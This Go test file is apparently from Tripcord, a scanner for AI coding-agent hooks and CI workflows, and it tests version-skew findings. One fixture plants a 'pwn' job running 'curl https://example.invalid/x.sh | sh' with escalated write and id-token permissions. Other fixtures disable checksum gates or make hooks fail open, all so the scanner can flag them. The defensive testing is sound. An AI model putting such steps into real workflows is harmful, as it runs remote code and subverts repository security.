package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/vgmartinez/tripcord/internal/embedded"
	"github.com/vgmartinez/tripcord/internal/exitcode"
	"github.com/vgmartinez/tripcord/internal/model"
)

// The version-skew contract of TC-CFG-016, end to end through scan: a
// scanner older than the init that wrote an embed reports no high for
// that embed as written, and still reports high for every security
// mutation of it. TestVersionSkewCIScanner runs the real older scanner;
// these tests simulate it with a synthetic newer embed, so they do not
// depend on a repin.

const skewExecuting = "vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@" + skewUnknownPin

// withScannerVersion sets main.version for the test.
func withScannerVersion(t *testing.T, v string) {
	t.Helper()
	saved := version
	version = v
	t.Cleanup(func() { version = saved })
}

// scanLocally is the remediation both the unverified and the outdated
// findings carry, in the fix every format prints.
const scanLocally = "scan locally with the latest Tripcord"

// skewFinding is a TC-CFG-016 finding scan reported.
type skewFinding struct {
	path, title, fix string
	severity         model.Severity
}

func skewScan(t *testing.T, args ...string) []skewFinding {
	t.Helper()
	code, stdout, stderr := runCLI(t, append([]string{"scan", "--format", "json"}, args...)...)
	if code != int(exitcode.OK) && code != int(exitcode.Findings) {
		t.Fatalf("scan %v: exit %d: %s", args, code, stderr)
	}
	var out []skewFinding
	for _, line := range strings.Split(strings.TrimSpace(stdout), "\n") {
		if line == "" {
			continue
		}
		var f model.Finding
		mustJSON(t, line, &f)
		if f.Rule == "TC-CFG-016" {
			out = append(out, skewFinding{f.Location.Path, f.Title, f.Fix, f.Severity})
		}
	}
	return out
}

func skewHighs(fs []skewFinding) []skewFinding {
	var out []skewFinding
	for _, f := range fs {
		if f.severity == model.SeverityHigh || f.severity == model.SeverityCritical {
			out = append(out, f)
		}
	}
	return out
}

// newerEmbed changes all six surfaces the older CI scanner flags
// (Claude SessionStart and PreToolUse, Cursor and Copilot preToolUse,
// tripcord.yml, bootstrap.sh) the way a later init could, records the
// result in embed.json, and pins a tripcord-pr.yml no released
// Tripcord knows.
func newerEmbed(t *testing.T, dir string) {
	t.Helper()
	edits(
		replaceInFile(embedded.BootstrapPath, "set -eu\n", "set -eu\n# written by a later Tripcord\n"),
		replaceInFile(embedded.ClaudeSettingsPath, `"onFailure": "block"`, `"onFailure": "block", "timeout": 30`),
		replaceInFile(embedded.ClaudeSettingsPath, `session-start --harness claude"`, `session-start --harness claude", "timeout": 300`),
		replaceInFile(embedded.CursorHooksPath, `"failClosed": true`, `"failClosed": true, "timeout": 30`),
		replaceInFile(embedded.CopilotHooksPath, `"timeoutSec": 60`, `"timeoutSec": 90`),
		replaceInFile(embedded.WorkflowPath, "\non:\n", "\n# written by a later Tripcord\non:\n"),
		repinWorkflowTo(skewUnknownPin),
		rerecord,
	)(t, dir)
}

// newerEmbedRepo is a repository whose base commit is a newer embed and
// whose head only adds a README, the way a pull request sees it.
func newerEmbedRepo(t *testing.T) string {
	t.Helper()
	repo := embeddedBase(t, "--cloud-setup")
	newerEmbed(t, repo)
	commitAll(t, repo)
	writeTestFile(t, repo, "README.md", "docs\n")
	commitAll(t, repo)
	return repo
}

func TestVersionSkewNewerEmbedHasNoHigh(t *testing.T) {
	repo := newerEmbedRepo(t)
	for name, tc := range map[string]struct {
		version string
		ci      bool
		args    []string
	}{
		"ci dev scanner":                 {"dev", true, nil},
		"ci older release":               {"0.0.9", true, nil},
		"ci executing workflow and base": {"dev", false, []string{"--base", "HEAD~1", "--executing-workflow", skewExecuting}},
		"trusted older release":          {"0.0.9", false, nil},
		"trusted older release and base": {"0.0.9", false, []string{"--base", "HEAD~1"}},
	} {
		t.Run(name, func(t *testing.T) {
			withScannerVersion(t, tc.version)
			if tc.ci {
				t.Setenv("GITHUB_ACTIONS", "true")
			}
			got := skewScan(t, append(tc.args, repo)...)
			if highs := skewHighs(got); len(highs) != 0 {
				t.Fatalf("newer embed: high findings %+v", highs)
			}
			if len(got) == 0 {
				t.Fatal("newer embed: no unverified findings; is the embed newer at all?")
			}
			assertScanLocally(t, got)
			if name == "trusted older release" {
				code, stdout, stderr := runCLI(t, "scan", "--format", "text", repo)
				if code != int(exitcode.OK) || !strings.Contains(stdout, scanLocally) {
					t.Fatalf("text: exit %d\n%s\n%s", code, stdout, stderr)
				}
			}
		})
	}
}

// assertScanLocally fails unless every finding's remediation, the fix
// text, JSON, and the other formats print, tells the reader to scan
// locally with the latest Tripcord. Unverified and outdated share it.
func assertScanLocally(t *testing.T, got []skewFinding) {
	t.Helper()
	for _, f := range got {
		if !strings.Contains(f.fix, scanLocally) {
			t.Errorf("%s %q: fix %q does not contain %q", f.path, f.title, f.fix, scanLocally)
		}
	}
}

// TestVersionSkewTrustedDevScannerFlagsUnknownPin: only a release
// scanner older than embed.json's version may read an unknown pin as a
// newer Tripcord's. A dev build, the same release, or a newer one, cannot.
func TestVersionSkewTrustedDevScannerFlagsUnknownPin(t *testing.T) {
	repo := newerEmbedRepo(t)
	for _, v := range []string{"dev", "0.1.0", "0.2.0"} {
		withScannerVersion(t, v)
		highs := skewHighs(skewScan(t, repo))
		if len(highs) != 1 || highs[0].path != embedded.WorkflowPath || highs[0].title != "Tripcord workflow pins an unknown commit" {
			t.Fatalf("scanner %s: highs = %+v, want one pin-unknown on %s", v, highs, embedded.WorkflowPath)
		}
	}
}

// TestVersionSkewKnownPinIsOutdatedLow: an embed under a pin
// KnownWorkflowPins lists is outdated, low. No rule fixture can hold
// that state while the list is empty, so this pins the clause.
func TestVersionSkewKnownPinIsOutdatedLow(t *testing.T) {
	saved := embedded.KnownWorkflowPins
	embedded.KnownWorkflowPins = []string{skewUnknownPin}
	t.Cleanup(func() { embedded.KnownWorkflowPins = saved })
	repo := embeddedBase(t)
	edits(repinWorkflowTo(skewUnknownPin), rerecord)(t, repo)
	got := skewScan(t, repo)
	want := skewFinding{path: embedded.WorkflowPath, title: "Tripcord guard was written by another Tripcord version", severity: model.SeverityLow}
	if len(got) != 1 || got[0].path != want.path || got[0].title != want.title || got[0].severity != want.severity {
		t.Fatalf("findings = %+v, want %+v", got, want)
	}
	assertScanLocally(t, got)
	code, stdout, stderr := runCLI(t, "scan", "--format", "text", repo)
	if code != int(exitcode.OK) || !strings.Contains(stdout, scanLocally) {
		t.Fatalf("text: exit %d\n%s\n%s", code, stdout, stderr)
	}
}

func TestVersionSkewMutationsStayHigh(t *testing.T) {
	inflate := func(t *testing.T, dir string) {
		t.Helper()
		replaceInFile(embedded.ManifestPath, `"version": "0.1.0"`, `"version": "99.0.0"`)(t, dir)
	}
	for name, edit := range map[string]func(*testing.T, string){
		"inflated version with onFailure continue": edits(inflate,
			replaceInFile(embedded.BootstrapPath, "TRIPCORD_VERSION='0.1.0'", "TRIPCORD_VERSION='99.0.0'"),
			replaceInFile(embedded.ClaudeSettingsPath, `"onFailure": "block"`, `"onFailure": "continue"`), rerecord),
		"inflated version alone": edits(inflate, rerecord),
		"fail-on critical":       edits(replaceInFile(embedded.WorkflowPath, "fail-on: high", "fail-on: critical"), rerecord),
		"checksum gate disabled": edits(replaceInFile(embedded.BootstrapPath, `[ "$got" != "$want" ]`, `false`), rerecord),
		"install || true": replaceInFile(embedded.CopilotSetupStepsPath,
			"run: bash .tripcord/bootstrap.sh install", "run: bash .tripcord/bootstrap.sh install || true"),
		"gitattributes -text": replaceInFile(embedded.GitattributesPath,
			"/"+embedded.BootstrapPath+" text eol=lf\n", "/"+embedded.BootstrapPath+" -text\n"),
		"pre-tool guard removed": edits(replaceInFile(embedded.ClaudeSettingsPath, claudeHookCommand, `"command": "true",`), rerecord),
		"cursor fail open":       edits(replaceInFile(embedded.CursorHooksPath, `"failClosed": true, "timeout": 30`, `"failClosed": false, "timeout": 30`), rerecord),
		"malformed pin":          edits(replaceInFile(embedded.WorkflowPath, "tripcord-pr.yml@"+skewUnknownPin, "tripcord-pr.yml@main"), rerecord),
	} {
		t.Run(name, func(t *testing.T) {
			for _, scanner := range []struct {
				version string
				ci      bool
			}{{"dev", true}, {"0.0.9", false}, {"0.0.9", true}} {
				repo := embeddedBase(t, "--cloud-setup")
				newerEmbed(t, repo)
				edit(t, repo)
				withScannerVersion(t, scanner.version)
				if scanner.ci {
					t.Setenv("GITHUB_ACTIONS", "true")
				} else {
					t.Setenv("GITHUB_ACTIONS", "")
				}
				if highs := skewHighs(skewScan(t, repo)); len(highs) == 0 {
					t.Errorf("scanner %s ci=%v: no high finding", scanner.version, scanner.ci)
				}
			}
		})
	}
}

// TestVersionSkewBaseMutationsStayHigh: a change relative to the base is
// high in a CI scan with --executing-workflow, including a repin to
// exactly the workflow that runs: under pull_request the pull request's
// own tripcord.yml picks that workflow, so it attests only to itself.
func TestVersionSkewBaseMutationsStayHigh(t *testing.T) {
	for name, edit := range map[string]func(*testing.T, string){
		"repinned to the executing workflow": edits(repinWorkflowTo(skewUnknownPin), rerecord),
		"bootstrap removed":                  removeFile(embedded.BootstrapPath),
		"inflated version":                   edits(replaceInFile(embedded.ManifestPath, `"version": "0.1.0"`, `"version": "99.0.0"`), rerecord),
	} {
		t.Run(name, func(t *testing.T) {
			repo := embeddedBase(t)
			edit(t, repo)
			commitAll(t, repo)
			highs := skewHighs(skewScan(t, "--base", "HEAD~1", "--executing-workflow", skewExecuting, repo))
			if len(highs) == 0 {
				t.Fatal("no high finding")
			}
		})
	}
}

func TestScanExecutingWorkflowFlag(t *testing.T) {
	repo := embeddedBase(t)
	for _, bad := range []string{
		"",
		"vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@",
		"vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@" + embedded.WorkflowPin[:7],
		"vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@main",
		"someone-else/tripcord/.github/workflows/tripcord-pr.yml@" + embedded.WorkflowPin,
		"vgmartinez/tripcord/.github/workflows/tripcord.yml@" + embedded.WorkflowPin,
	} {
		code, _, stderr := runCLI(t, "scan", "--executing-workflow", bad, repo)
		if code != int(exitcode.Config) || !strings.Contains(stderr, "--executing-workflow") {
			t.Errorf("--executing-workflow %q: exit %d, stderr %q", bad, code, stderr)
		}
	}
	good := "vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@" + embedded.WorkflowPin
	if code, _, stderr := runCLI(t, "scan", "--staged", "--executing-workflow", good); code != int(exitcode.Config) || !strings.Contains(stderr, "--staged") {
		t.Errorf("--staged with --executing-workflow: exit %d, stderr %q", code, stderr)
	}
	if code, _, stderr := runCLI(t, "scan", "--executing-workflow", good, repo); code != int(exitcode.OK) {
		t.Errorf("valid --executing-workflow on a fresh embed: exit %d: %s", code, stderr)
	}
	if code, _, _ := runCLI(t, "preopen", "--executing-workflow", good, repo); code != int(exitcode.Config) {
		t.Errorf("preopen accepted --executing-workflow: exit %d", code)
	}
}

// TestVersionSkewFirstIntroductionRepro is the reviewer's case: a base
// with no embed, then an embed whose pin is aaaa..., permissions
// contents: write and id-token: write, an extra job that runs curl|sh,
// and embed.json version 99.0.0 with the digests re-recorded. CI with
// --executing-workflow pointing at that pin, and an older trusted
// release, both report the workflow high.
func TestVersionSkewFirstIntroductionRepro(t *testing.T) {
	pin := strings.Repeat("a", 40)
	exec := "vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@" + pin
	repo := firstIntroductionRepo(t, edits(
		replaceInFile(embedded.WorkflowPath, "      contents: read # checkout the repository being scanned\n      pull-requests: read # tripcord-pr.yml reads pull request reviews\n      security-events: write # upload the SARIF report\n", "      contents: write\n      id-token: write\n"),
		replaceInFile(embedded.WorkflowPath, "      fail-on: high\n", "      fail-on: high\n  pwn:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://example.invalid/x.sh | sh\n"),
	))
	for _, scanner := range []struct {
		name    string
		version string
		args    []string
	}{
		{"older trusted release", "0.0.9", []string{repo}},
		{"CI first introduction", "dev", []string{"--base", "HEAD~1", "--executing-workflow", exec, repo}},
	} {
		t.Run(scanner.name, func(t *testing.T) {
			withScannerVersion(t, scanner.version)
			if scanner.name == "older trusted release" {
				t.Setenv("GITHUB_ACTIONS", "")
			}
			code, stdout, stderr := runCLI(t, append([]string{"scan", "--format", "json"}, scanner.args...)...)
			if code != int(exitcode.Findings) {
				t.Fatalf("exit %d, want findings\n%s\n%s", code, stdout, stderr)
			}
			var workflow bool
			for _, f := range skewScan(t, scanner.args...) {
				if f.path == embedded.WorkflowPath && (f.severity == model.SeverityHigh || f.severity == model.SeverityCritical) {
					workflow = true
				}
			}
			if !workflow {
				t.Fatal("tripcord.yml is not high")
			}
		})
	}
}

// TestVersionSkewFirstIntroductionStaysLow: the same first introduction
// with no shape change stays low. The pin matches --executing-workflow
// and only attests to itself.
func TestVersionSkewFirstIntroductionStaysLow(t *testing.T) {
	pin := strings.Repeat("a", 40)
	exec := "vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@" + pin
	repo := firstIntroductionRepo(t, nil)
	withScannerVersion(t, "0.0.9")
	t.Setenv("GITHUB_ACTIONS", "")
	got := skewScan(t, "--base", "HEAD~1", "--executing-workflow", exec, repo)
	if highs := skewHighs(got); len(highs) != 0 {
		t.Fatalf("clean first introduction: high %+v", highs)
	}
	if len(got) == 0 {
		t.Fatal("clean first introduction produced no finding")
	}
	assertScanLocally(t, got)
}

// firstIntroductionRepo is a repository whose base commit has no embed
// and whose head is init --embed --version 99.0.0, plus edit, with the
// workflow pin set to aaaa... and the digests re-recorded.
func firstIntroductionRepo(t *testing.T, edit func(*testing.T, string)) string {
	t.Helper()
	repo := gitRepo(t)
	if code, _, stderr := runCLI(t, "init", "--embed", "--version", "99.0.0", "--sha256", "linux-x64="+testSHA256, repo); code != 0 {
		t.Fatalf("init: exit %d: %s", code, stderr)
	}
	steps := []func(*testing.T, string){repinWorkflowTo(strings.Repeat("a", 40)), rerecord}
	if edit != nil {
		steps = append([]func(*testing.T, string){edit}, steps...)
	}
	edits(steps...)(t, repo)
	commitAll(t, repo)
	return repo
}

// TestInitRefusesOlderVersion: a release init pinning an older release
// would leave the pinned binary's own scan judging a newer embed.
func TestInitRefusesOlderVersion(t *testing.T) {
	withScannerVersion(t, "v0.2.0")
	for _, tc := range []struct {
		pin  string
		code exitcode.Code
	}{{"0.1.0", exitcode.Config}, {"0.2.0-rc.1", exitcode.Config}, {"0.2.0", exitcode.OK}, {"0.3.0", exitcode.OK}} {
		dir := embedRoot(t)
		code, _, stderr := runCLI(t, "init", "--embed", "--version", tc.pin, "--sha256", "linux-x64="+testSHA256, dir)
		if code != int(tc.code) {
			t.Fatalf("--version %s: exit %d, want %d: %s", tc.pin, code, tc.code, stderr)
		}
		_, err := os.Stat(filepath.Join(dir, filepath.FromSlash(embedded.ManifestPath)))
		if wrote := err == nil; wrote != (tc.code == exitcode.OK) {
			t.Fatalf("--version %s: wrote embed.json = %v", tc.pin, wrote)
		}
		if tc.code != exitcode.OK && !strings.Contains(stderr, "older than this tripcord") {
			t.Fatalf("--version %s: stderr %q", tc.pin, stderr)
		}
	}
	withScannerVersion(t, "dev")
	if code, _, stderr := runCLI(t, "init", "--embed", "--version", "0.0.1", "--sha256", "linux-x64="+testSHA256, embedRoot(t)); code != int(exitcode.OK) {
		t.Fatalf("dev build: exit %d: %s", code, stderr)
	}
}
